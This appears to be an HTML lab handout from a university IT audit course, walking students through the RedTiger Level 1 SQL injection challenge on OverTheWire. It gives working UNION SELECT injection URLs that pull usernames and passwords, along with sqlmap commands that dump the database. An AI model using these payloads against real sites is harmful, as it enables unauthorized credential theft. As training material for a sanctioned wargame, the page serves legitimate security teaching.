@@ -1,0 +1,1001 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SQL Injection Lab – RedTiger Level 1</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0e14;
+    --bg2: #0f1520;
+    --bg3: #141c2e;
+    --panel: #111827;
+    --border: #1e3a5f;
+    --accent: #00d4ff;
+    --accent2: #ff6b35;
+    --accent3: #39ff14;
+    --warn: #ffd700;
+    --danger: #ff3860;
+    --text: #c9d1d9;
+    --text-dim: #6e7f94;
+    --text-bright: #e6edf3;
+    --mono: 'Share Tech Mono', monospace;
+    --sans: 'Rajdhani', sans-serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    font-size: 16px;
+    line-height: 1.7;
+    min-height: 100vh;
+    background-image:
+      radial-gradient(ellipse at 10% 20%, rgba(0,212,255,0.04) 0%, transparent 50%),
+      radial-gradient(ellipse at 90% 80%, rgba(255,107,53,0.04) 0%, transparent 50%);
+  }
+
+  /* SCANLINE OVERLAY */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.03) 2px,
+      rgba(0,0,0,0.03) 4px
+    );
+    pointer-events: none;
+    z-index: 1000;
+  }
+
+  .container {
+    max-width: 960px;
+    margin: 0 auto;
+    padding: 40px 24px 80px;
+  }
+
+  /* HEADER */
+  .header {
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 32px;
+    margin-bottom: 48px;
+    position: relative;
+  }
+
+  .header::before {
+    content: '';
+    position: absolute;
+    bottom: -1px;
+    left: 0;
+    width: 120px;
+    height: 2px;
+    background: var(--accent);
+  }
+
+  .badge-row {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 16px;
+    flex-wrap: wrap;
+  }
+
+  .badge {
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 3px 10px;
+    border-radius: 2px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .badge-course { background: rgba(0,212,255,0.1); color: var(--accent); border: 1px solid rgba(0,212,255,0.3); }
+  .badge-level { background: rgba(57,255,20,0.1); color: var(--accent3); border: 1px solid rgba(57,255,20,0.3); }
+  .badge-type { background: rgba(255,107,53,0.1); color: var(--accent2); border: 1px solid rgba(255,107,53,0.3); }
+
+  h1 {
+    font-family: var(--sans);
+    font-size: 2.6rem;
+    font-weight: 700;
+    color: var(--text-bright);
+    letter-spacing: 1px;
+    line-height: 1.2;
+    margin-bottom: 10px;
+  }
+
+  h1 span { color: var(--accent); }
+
+  .subtitle {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--text-dim);
+    letter-spacing: 0.5px;
+  }
+
+  /* OBJECTIVE BOX */
+  .objective {
+    background: linear-gradient(135deg, rgba(0,212,255,0.06), rgba(0,212,255,0.02));
+    border: 1px solid rgba(0,212,255,0.25);
+    border-left: 3px solid var(--accent);
+    border-radius: 4px;
+    padding: 20px 24px;
+    margin-bottom: 40px;
+  }
+
+  .objective-title {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 10px;
+  }
+
+  .objective p {
+    font-size: 15px;
+    color: var(--text-bright);
+  }
+
+  .objective strong { color: var(--warn); }
+
+  /* INFO GRID */
+  .info-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 16px;
+    margin-bottom: 48px;
+  }
+
+  .info-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 16px 20px;
+  }
+
+  .info-card-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 6px;
+  }
+
+  .info-card-value {
+    font-family: var(--mono);
+    font-size: 14px;
+    color: var(--accent3);
+  }
+
+  /* STEPS */
+  .steps-title {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-bottom: 24px;
+  }
+
+  .step {
+    margin-bottom: 40px;
+    position: relative;
+    padding-left: 56px;
+    animation: fadeIn 0.4s ease both;
+  }
+
+  .step:nth-child(1) { animation-delay: 0.1s; }
+  .step:nth-child(2) { animation-delay: 0.2s; }
+  .step:nth-child(3) { animation-delay: 0.3s; }
+  .step:nth-child(4) { animation-delay: 0.4s; }
+  .step:nth-child(5) { animation-delay: 0.5s; }
+  .step:nth-child(6) { animation-delay: 0.6s; }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(12px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .step-num {
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 36px;
+    height: 36px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--accent);
+  }
+
+  .step-line {
+    position: absolute;
+    left: 17px;
+    top: 36px;
+    bottom: -40px;
+    width: 1px;
+    background: linear-gradient(to bottom, var(--border), transparent);
+  }
+
+  .step:last-child .step-line { display: none; }
+
+  .step-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 12px;
+    min-height: 36px;
+  }
+
+  .step h2 {
+    font-family: var(--sans);
+    font-size: 1.15rem;
+    font-weight: 700;
+    color: var(--text-bright);
+    letter-spacing: 0.5px;
+  }
+
+  .step p {
+    font-size: 15px;
+    color: var(--text);
+    margin-bottom: 14px;
+  }
+
+  /* CODE BLOCK */
+  .code-block {
+    background: #080c12;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    margin: 14px 0;
+    overflow: hidden;
+  }
+
+  .code-block-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 14px;
+    background: rgba(255,255,255,0.03);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-type {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .copy-btn {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    background: none;
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    padding: 2px 8px;
+    cursor: pointer;
+    transition: all 0.2s;
+    letter-spacing: 1px;
+  }
+
+  .copy-btn:hover { color: var(--accent); border-color: var(--accent); }
+  .copy-btn.copied { color: var(--accent3); border-color: var(--accent3); }
+
+  .code-block pre {
+    padding: 16px 18px;
+    font-family: var(--mono);
+    font-size: 13px;
+    line-height: 1.8;
+    overflow-x: auto;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  /* SYNTAX COLORS */
+  .kw { color: #ff79c6; }
+  .str { color: #f1fa8c; }
+  .num { color: #bd93f9; }
+  .url { color: var(--accent); }
+  .flag { color: var(--accent2); }
+  .comment { color: var(--text-dim); font-style: italic; }
+  .val { color: var(--accent3); }
+
+  /* TABS */
+  .tab-group { margin: 16px 0; }
+
+  .tab-buttons {
+    display: flex;
+    gap: 0;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 0;
+  }
+
+  .tab-btn {
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 8px 18px;
+    background: none;
+    border: none;
+    border-bottom: 2px solid transparent;
+    color: var(--text-dim);
+    cursor: pointer;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    transition: all 0.2s;
+    margin-bottom: -1px;
+  }
+
+  .tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
+  .tab-btn:hover:not(.active) { color: var(--text); }
+
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  /* CALLOUT */
+  .callout {
+    display: flex;
+    gap: 12px;
+    padding: 14px 18px;
+    border-radius: 4px;
+    margin: 14px 0;
+    font-size: 14px;
+  }
+
+  .callout-icon { font-size: 16px; flex-shrink: 0; margin-top: 2px; }
+  .callout-info { background: rgba(0,212,255,0.07); border: 1px solid rgba(0,212,255,0.2); }
+  .callout-warn { background: rgba(255,215,0,0.07); border: 1px solid rgba(255,215,0,0.2); }
+  .callout-success { background: rgba(57,255,20,0.07); border: 1px solid rgba(57,255,20,0.2); }
+  .callout-danger { background: rgba(255,56,96,0.07); border: 1px solid rgba(255,56,96,0.2); }
+
+  .callout-info .callout-icon { color: var(--accent); }
+  .callout-warn .callout-icon { color: var(--warn); }
+  .callout-success .callout-icon { color: var(--accent3); }
+  .callout-danger .callout-icon { color: var(--danger); }
+
+  /* EXPECTED OUTPUT */
+  .expected {
+    background: #080c12;
+    border: 1px solid rgba(57,255,20,0.2);
+    border-left: 3px solid var(--accent3);
+    border-radius: 4px;
+    padding: 14px 18px;
+    margin: 14px 0;
+  }
+
+  .expected-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--accent3);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .expected pre {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text);
+    white-space: pre-wrap;
+  }
+
+  /* DIVIDER */
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 48px 0;
+  }
+
+  /* SECTION TITLE */
+  .section-title {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--accent2);
+    margin-bottom: 24px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid rgba(255,107,53,0.2);
+  }
+
+  /* QUESTIONS */
+  .questions { margin-bottom: 40px; }
+
+  .question {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    margin-bottom: 12px;
+    overflow: hidden;
+  }
+
+  .question-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 14px 18px;
+    cursor: pointer;
+    user-select: none;
+    transition: background 0.2s;
+  }
+
+  .question-header:hover { background: rgba(255,255,255,0.03); }
+
+  .q-num {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent2);
+    min-width: 24px;
+  }
+
+  .q-text {
+    font-size: 14px;
+    color: var(--text-bright);
+    flex: 1;
+  }
+
+  .q-arrow {
+    font-size: 12px;
+    color: var(--text-dim);
+    transition: transform 0.2s;
+  }
+
+  .question.open .q-arrow { transform: rotate(90deg); color: var(--accent); }
+
+  .question-answer {
+    display: none;
+    padding: 0 18px 16px 54px;
+  }
+
+  .question.open .question-answer { display: block; }
+
+  .question-answer p {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--accent3);
+  }
+
+  /* FOOTER */
+  .footer {
+    margin-top: 64px;
+    padding-top: 24px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: gap;
+    gap: 12px;
+  }
+
+  .footer-left {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+  }
+
+  .footer-right {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+  }
+
+  .footer-right span { color: var(--accent); }
+
+  /* PROGRESS BAR */
+  .progress-bar {
+    position: fixed;
+    top: 0; left: 0;
+    height: 2px;
+    background: linear-gradient(to right, var(--accent), var(--accent2));
+    z-index: 999;
+    transition: width 0.2s;
+  }
+
+  /* TERMINAL BLINK */
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+  }
+  .cursor { animation: blink 1s infinite; color: var(--accent3); }
+
+  /* INLINE CODE */
+  code {
+    font-family: var(--mono);
+    font-size: 13px;
+    background: rgba(0,212,255,0.08);
+    border: 1px solid rgba(0,212,255,0.15);
+    border-radius: 2px;
+    padding: 1px 6px;
+    color: var(--accent);
+  }
+
+  /* RESPONSIVE */
+  @media (max-width: 640px) {
+    h1 { font-size: 1.8rem; }
+    .step { padding-left: 44px; }
+    .step-num { width: 30px; height: 30px; font-size: 11px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="progress-bar" id="progressBar"></div>
+
+<div class="container">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="badge-row">
+      <span class="badge badge-course">IT Audit &amp; Cybersecurity</span>
+      <span class="badge badge-level">Level 1</span>
+      <span class="badge badge-type">UNION-based SQLi</span>
+    </div>
+    <h1>SQL Injection Lab<br><span>RedTiger — Level 1</span></h1>
+    <p class="subtitle">redtiger.labs.overthewire.org/level1.php <span class="cursor">█</span></p>
+  </div>
+
+  <!-- OBJECTIVE -->
+  <div class="objective">
+    <div class="objective-title">▸ Objective</div>
+    <p>
+      Find and exploit a <strong>SQL Injection</strong> vulnerability in the <code>cat</code> parameter.
+      Extract the <strong>username and password</strong> of user <strong>Hornoxe</strong>
+      from the table <code>level1_users</code>.
+    </p>
+  </div>
+
+  <!-- INFO GRID -->
+  <div class="info-grid">
+    <div class="info-card">
+      <div class="info-card-label">Target URL</div>
+      <div class="info-card-value">level1.php?cat=1</div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-label">Parameter</div>
+      <div class="info-card-value">cat (numeric)</div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-label">Table Name</div>
+      <div class="info-card-value">level1_users</div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-label">Attack Type</div>
+      <div class="info-card-value">UNION SELECT</div>
+    </div>
+  </div>
+
+  <!-- BACKGROUND -->
+  <div class="section-title">Background — What is SQL Injection?</div>
+
+  <div style="margin-bottom: 40px;">
+    <p style="margin-bottom: 14px; font-size: 15px;">
+      A web application uses SQL queries to get data from a database. When user input is placed
+      directly inside a query <em>without validation</em>, an attacker can change the meaning of that query.
+    </p>
+
+    <p style="margin-bottom: 10px; font-size: 15px;">Normal query (safe):</p>
+    <div class="code-block">
+      <div class="code-block-header">
+        <span class="code-type">SQL</span>
+      </div>
+      <pre><span class="kw">SELECT</span> * <span class="kw">FROM</span> articles <span class="kw">WHERE</span> cat = <span class="num">1</span></pre>
+    </div>
+
+    <p style="margin-bottom: 10px; font-size: 15px;">After injection (dangerous):</p>
+    <div class="code-block">
+      <div class="code-block-header">
+        <span class="code-type">SQL</span>
+      </div>
+      <pre><span class="kw">SELECT</span> * <span class="kw">FROM</span> articles <span class="kw">WHERE</span> cat = <span class="num">0</span>
+<span class="kw">UNION SELECT</span> <span class="num">1</span>,<span class="num">2</span>,username,password <span class="kw">FROM</span> level1_users</pre>
+    </div>
+
+    <div class="callout callout-info">
+      <span class="callout-icon">ℹ</span>
+      <span>Because the parameter is <strong>numeric</strong>, we do not need quotes around our input.
+      This is called a <em>numeric SQL injection</em>.</span>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <!-- STEPS -->
+  <div class="section-title">Step-by-Step Walkthrough</div>
+  <div class="steps-container">
+
+    <!-- STEP 1 -->
+    <div class="step">
+      <div class="step-num">01</div>
+      <div class="step-line"></div>
+      <div class="step-header"><h2>Open the Target Page</h2></div>
+      <p>Open your browser and go to the target URL. You will see a simple page that shows articles by category.</p>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-type">URL</span>
+          <button class="copy-btn" onclick="copyCode(this, 'https://redtiger.labs.overthewire.org/level1.php?cat=1')">COPY</button>
+        </div>
+        <pre><span class="url">https://redtiger.labs.overthewire.org/level1.php?cat=1</span></pre>
+      </div>
+      <div class="callout callout-info">
+        <span class="callout-icon">ℹ</span>
+        <span>Notice the URL: <code>cat=1</code>. This number controls which category is shown.
+        We will try to change what the database returns by modifying this value.</span>
+      </div>
+    </div>
+
+    <!-- STEP 2 -->
+    <div class="step">
+      <div class="step-num">02</div>
+      <div class="step-line"></div>
+      <div class="step-header"><h2>Confirm the Vulnerability</h2></div>
+      <p>Test whether the parameter reacts to SQL logic. Try these two URLs and compare the results:</p>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-type">URL — Should show content</span>
+          <button class="copy-btn" onclick="copyCode(this, 'https://redtiger.labs.overthewire.org/level1.php?cat=1 AND 1=1')">COPY</button>
+        </div>
+        <pre><span class="url">https://redtiger.labs.overthewire.org/level1.php</span>?<span class="flag">cat</span>=<span class="num">1</span> <span class="kw">AND</span> <span class="num">1</span>=<span class="num">1</span></pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-type">URL — Should show NO content</span>
+          <button class="copy-btn" onclick="copyCode(this, 'https://redtiger.labs.overthewire.org/level1.php?cat=1 AND 1=2')">COPY</button>
+        </div>
+        <pre><span class="url">https://redtiger.labs.overthewire.org/level1.php</span>?<span class="flag">cat</span>=<span class="num">1</span> <span class="kw">AND</span> <span class="num">1</span>=<span class="num">2</span></pre>
+      </div>
+
+      <div class="expected">
+        <div class="expected-label">✓ Expected Result</div>
+        <pre>AND 1=1  →  page shows article content  (true condition)
+AND 1=2  →  page is empty or shows nothing  (false condition)
+
+If the page behaves differently → the parameter IS vulnerable!</pre>
+      </div>
+    </div>
+
+    <!-- STEP 3 -->
+    <div class="step">
+      <div class="step-num">03</div>
+      <div class="step-line"></div>
+      <div class="step-header"><h2>Find the Number of Columns</h2></div>
+      <p>Before using <code>UNION SELECT</code>, we must know how many columns the original query returns.
+      Use <code>ORDER BY</code> and increase the number until the page breaks.</p>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-type">URL — Test column count</span>
+          <button class="copy-btn" onclick="copyCode(this, 'https://redtiger.labs.overthewire.org/level1.php?cat=1 ORDER BY 4--')">COPY</button>
+        </div>
+        <pre><span class="url">https://redtiger.labs.overthewire.org/level1.php</span>?<span class="flag">cat</span>=<span class="num">1</span> <span class="kw">ORDER BY</span> <span class="num">4</span><span class="comment">--</span>
+<span class="url">https://redtiger.labs.overthewire.org/level1.php</span>?<span class="flag">cat</span>=<span class="num">1</span> <span class="kw">ORDER BY</span> <span class="num">5</span><span class="comment">--</span></pre>
+      </div>
+
+      <div class="expected">
+        <div class="expected-label">✓ Expected Result</div>
+        <pre>ORDER BY 4  →  page works normally
+ORDER BY 5  →  error or empty page
+
+Conclusion: the query has exactly 4 columns.</pre>
+      </div>
+
+      <div class="callout callout-warn">
+        <span class="callout-icon">⚠</span>
+        <span>The <code>--</code> at the end is a SQL comment. It tells the database to ignore everything after our injection. Some servers need <code>-- -</code> (with a space) or <code>#</code> instead.</span>
+      </div>
+    </div>
+
+    <!-- STEP 4 -->
+    <div class="step">
+      <div class="step-num">04</div>
+      <div class="step-line"></div>
+      <div class="step-header"><h2>Find Which Columns Are Visible</h2></div>
+      <p>Now we use <code>UNION SELECT</code> with 4 values and see which ones appear on the page.
+      We use <code>cat=0</code> so the original query returns no rows — only our injected data shows.</p>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-type">URL</span>
+          <button class="copy-btn" onclick="copyCode(this, 'https://redtiger.labs.overthewire.org/level1.php?cat=0 UNION SELECT 1,2,3,4--')">COPY</button>
+        </div>
+        <pre><span class="url">https://redtiger.labs.overthewire.org/level1.php</span>?<span class="flag">cat</span>=<span class="num">0</span> <span class="kw">UNION SELECT</span> <span class="num">1</span>,<span class="num">2</span>,<span class="num">3</span>,<span class="num">4</span><span class="comment">--</span></pre>
+      </div>
+
+      <div class="expected">
+        <div class="expected-label">✓ Expected Result</div>
+        <pre>Numbers appear in the page content, for example:  3  and  4
+
+This means columns 3 and 4 are displayed → we can use them to extract data.</pre>
+      </div>
+    </div>
+
+    <!-- STEP 5 -->
+    <div class="step">
+      <div class="step-num">05</div>
+      <div class="step-line"></div>
+      <div class="step-header"><h2>Extract Username and Password</h2></div>
+      <p>Replace the visible column positions with the column names from the <code>level1_users</code> table.
+      We want <code>username</code> and <code>password</code>.</p>
+
+      <div class="tab-group">
+        <div class="tab-buttons">
+          <button class="tab-btn active" onclick="switchTab(this, 'manual5')">Manual</button>
+          <button class="tab-btn" onclick="switchTab(this, 'sqlmap5')">SQLMap</button>
+        </div>
+
+        <div class="tab-content active" id="manual5">
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-type">URL — Extract credentials</span>
+              <button class="copy-btn" onclick="copyCode(this, 'https://redtiger.labs.overthewire.org/level1.php?cat=0 UNION SELECT 1,2,username,password FROM level1_users--')">COPY</button>
+            </div>
+            <pre><span class="url">https://redtiger.labs.overthewire.org/level1.php</span>?<span class="flag">cat</span>=<span class="num">0</span>
+<span class="kw">UNION SELECT</span> <span class="num">1</span>,<span class="num">2</span>,username,password
+<span class="kw">FROM</span> <span class="val">level1_users</span><span class="comment">--</span></pre>
+          </div>
+
+          <div class="callout callout-info">
+            <span class="callout-icon">ℹ</span>
+            <span>If you want only the user <strong>Hornoxe</strong>, add a WHERE clause:</span>
+          </div>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-type">URL — Filter by username</span>
+              <button class="copy-btn" onclick="copyCode(this, \"https://redtiger.labs.overthewire.org/level1.php?cat=0 UNION SELECT 1,2,username,password FROM level1_users WHERE username='Hornoxe'--\")">COPY</button>
+            </div>
+            <pre><span class="url">https://redtiger.labs.overthewire.org/level1.php</span>?<span class="flag">cat</span>=<span class="num">0</span>
+<span class="kw">UNION SELECT</span> <span class="num">1</span>,<span class="num">2</span>,username,password
+<span class="kw">FROM</span> <span class="val">level1_users</span>
+<span class="kw">WHERE</span> username=<span class="str">'Hornoxe'</span><span class="comment">--</span></pre>
+          </div>
+        </div>
+
+        <div class="tab-content" id="sqlmap5">
+          <div class="callout callout-warn">
+            <span class="callout-icon">⚠</span>
+            <span>Run SQLMap from <strong>Kali Linux</strong> or any terminal where sqlmap is installed.</span>
+          </div>
+
+          <p style="margin-bottom: 10px; font-size: 14px;"><strong>Step A</strong> — Detect the vulnerability and list databases:</p>
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-type">Terminal</span>
+              <button class="copy-btn" onclick="copyCode(this, `sqlmap -u 'https://redtiger.labs.overthewire.org/level1.php?cat=1' --dbs --level=3 --risk=2`)">COPY</button>
+            </div>
+            <pre>sqlmap <span class="flag">-u</span> <span class="str">'https://redtiger.labs.overthewire.org/level1.php?cat=1'</span> \
+       <span class="flag">--dbs</span> \
+       <span class="flag">--level</span>=<span class="num">3</span> <span class="flag">--risk</span>=<span class="num">2</span></pre>
+          </div>
+
+          <p style="margin-bottom: 10px; font-size: 14px;"><strong>Step B</strong> — List tables inside the database:</p>
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-type">Terminal</span>
+              <button class="copy-btn" onclick="copyCode(this, `sqlmap -u 'https://redtiger.labs.overthewire.org/level1.php?cat=1' -D hackit --tables`)">COPY</button>
+            </div>
+            <pre>sqlmap <span class="flag">-u</span> <span class="str">'https://redtiger.labs.overthewire.org/level1.php?cat=1'</span> \
+       <span class="flag">-D</span> <span class="val">hackit</span> \
+       <span class="flag">--tables</span></pre>
+          </div>
+
+          <p style="margin-bottom: 10px; font-size: 14px;"><strong>Step C</strong> — Dump all data from <code>level1_users</code>:</p>
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-type">Terminal</span>
+              <button class="copy-btn" onclick="copyCode(this, `sqlmap -u 'https://redtiger.labs.overthewire.org/level1.php?cat=1' -D hackit -T level1_users --dump`)">COPY</button>
+            </div>
+            <pre>sqlmap <span class="flag">-u</span> <span class="str">'https://redtiger.labs.overthewire.org/level1.php?cat=1'</span> \
+       <span class="flag">-D</span> <span class="val">hackit</span> \
+       <span class="flag">-T</span> <span class="val">level1_users</span> \
+       <span class="flag">--dump</span></pre>
+          </div>
+
+          <p style="margin-bottom: 10px; font-size: 14px;"><strong>Full command</strong> — All in one (aggressive scan):</p>
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-type">Terminal — Full</span>
+              <button class="copy-btn" onclick="copyCode(this, `sqlmap -u 'https://redtiger.labs.overthewire.org/level1.php?cat=1' --level=5 --risk=3 --dump-all`)">COPY</button>
+            </div>
+            <pre>sqlmap <span class="flag">-u</span> <span class="str">'https://redtiger.labs.overthewire.org/level1.php?cat=1'</span> \
+       <span class="flag">--level</span>=<span class="num">5</span> <span class="flag">--risk</span>=<span class="num">3</span> \
+       <span class="flag">--dump-all</span></pre>
+          </div>
+
+          <div class="callout callout-info">
+            <span class="callout-icon">ℹ</span>
+            <span><strong>SQLMap flag reference:</strong><br>
+            <code>-u</code> = target URL &nbsp;|&nbsp;
+            <code>--dbs</code> = list databases &nbsp;|&nbsp;
+            <code>-D</code> = select database &nbsp;|&nbsp;
+            <code>-T</code> = select table &nbsp;|&nbsp;
+            <code>--dump</code> = extract data &nbsp;|&nbsp;
+            <code>--level</code> = test depth (1–5) &nbsp;|&nbsp;
+            <code>--risk</code> = risk of tests (1–3)
+            </span>
+          </div>
+        </div>
+      </div>
+
+      <div class="expected">
+        <div class="expected-label">✓ Expected Result</div>
+        <pre>Username: Hornoxe
+Password: [the password you found]
+
+Enter these credentials on the level page to proceed to Level 2.</pre>
+      </div>
+    </div>
+
+    <!-- STEP 6 -->
+    <div class="step">
+      <div class="step-num">06</div>
+      <div class="step-line"></div>
+      <div class="step-header"><h2>Login and Complete the Level</h2></div>
+      <p>Enter the username and password you extracted into the login form on the level page.
+      If correct, the site will show a success message and unlock <strong>Level 2</strong>.</p>
+
+      <div class="callout callout-success">
+        <span class="callout-icon">✓</span>
+        <span>Congratulations! You have successfully completed a <strong>UNION-based SQL Injection</strong> attack.
+        You extracted sensitive data from a database by manipulating an unprotected SQL query.</span>
+      </div>
+
+      <div class="callout callout-danger">
+        <span class="callout-icon">⚠</span>
+        <span><strong>Legal notice:</strong> SQL injection on real websites without permission is illegal.
+        Only practice on authorized lab environments like OverTheWire, HackTheBox, or your own server.</span>
+      </div>
+    </div>
+
+  </div><!-- end steps -->
+
+  <hr class="divider">
+
+  <!-- KNOWLEDGE CHECK -->
+  <div class="section-title">Knowledge Check — Answer the Questions</div>
+  <div class="questions">
+
+    <div class="question" onclick="toggleQ(this)">
+      <div class="question-header">
+        <span class="q-num">Q1</span>
+        <span class="q-text">Why do we use <code>cat=0</code> instead of <code>cat=1</code> in the UNION SELECT payload?</span>
+        <span class="q-arrow">▶</span>
+      </div>
+      <div class="question-answer">
+        <p>Because <code>cat=0</code> returns zero rows from the original query. This means only our injected UNION SELECT data appears on the page, making it easy to read the extracted values without mixing them with normal content.</p>
+      </div>
+    </div>
+
+    <div class="question" onclick="toggleQ(this)">
+      <div class="question-header">
+        <span class="q-num">Q2</span>
+        <span class="q-text">What does the <code>--</code> at the end of the URL do?</span>
+        <span class="q-arrow">▶</span>
+      </div>
+      <div class="question-answer">
+        <p>It is a SQL comment. Everything after <code>--</code> is ignored by the database. This prevents syntax errors caused by the rest of the original query (e.g., a closing quote or extra conditions).</p>
+      </div>
+    </div>
+
+    <div class="question" onclick="toggleQ(this)">
+      <div class="question-header">
+        <span class="q-num">Q3</span>
+        <span class="q-text">Why is this injection called "numeric" and why don't we need an apostrophe (<code>'</code>)?</span>
+        <span class="q-arrow">▶</span>
+      </div>
+      <div class="question-answer">
+        <p>Because the original SQL query compares the <code>cat</code> value as a number: <code>WHERE cat = 1</code>. Numbers are not surrounded by quotes in SQL, so we can inject SQL keywords directly without needing to close a string with <code>'</code>.</p>
+      </div>
+    </div>
+
+    <div class="question" onclick="toggleQ(this)">
+      <div class="question-header">
+        <span class="q-num">Q4</span>
+        <span class="q-text">How does <code>ORDER BY</code> help us find the number of columns?</span>
+        <span class="q-arrow">▶</span>
+      </div>
+      <div class="question-answer">
+        <p><code>ORDER BY N</code> sorts results by the Nth column. If N is higher than the actual number of columns, the database throws an error. We increase N until we get an error — the last number that worked is the column count.</p>
+      </div>
+    </div>
+
+    <div class="question" onclick="toggleQ(this)">
+      <div class="question-header">
+        <span class="q-num">Q5</span>
+        <span class="q-text">What is the difference between manual injection and using SQLMap?</span>
+        <span class="q-arrow">▶</span>
+      </div>
+      <div class="question-answer">
+        <p>Manual injection requires you to understand and write each SQL payload yourself. SQLMap is an automated tool that detects and exploits SQL injection automatically. Manual is better for learning; SQLMap is faster in real penetration tests but can be noisy and trigger detection systems.</p>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- SUMMARY -->
+  <div class="section-title">Summary — What You Learned</div>
+  <div style="background: var(--panel); border: 1px solid var(--border); border-radius: 4px; padding: 24px; margin-bottom: 40px;">
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 20px;">
+      <div>
+        <div style="font-family: var(--mono); font-size: 10px; color: var(--accent); letter-spacing: 2px; margin-bottom: 10px;">TECHNIQUE</div>
+        <p style="font-size: 14px;">UNION-based SQL Injection on a numeric GET parameter</p>
+      </div>
+      <div>
+        <div style="font-family: var(--mono); font-size: 10px; color: var(--accent2); letter-spacing: 2px; margin-bottom: 10px;">PROCESS</div>
+        <p style="font-size: 14px;">Confirm vuln → count columns → find visible columns → extract data</p>
+      </div>
+      <div>
+        <div style="font-family: var(--mono); font-size: 10px; color: var(--accent3); letter-spacing: 2px; margin-bottom: 10px;">TOOLS USED</div>
+        <p style="font-size: 14px;">Browser (manual) and SQLMap (automated)</p>
+      </div>
+      <div>
+        <div style="font-family: var(--mono); font-size: 10px; color: var(--warn); letter-spacing: 2px; margin-bottom: 10px;">NEXT STEP</div>
+        <p style="font-size: 14px;">Level 2 — Login bypass using SQL injection in a POST form</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="footer">
+    <div class="footer-left">
+      IT Audit &amp; Cybersecurity Lab · Universitatea de Vest din Timișoara
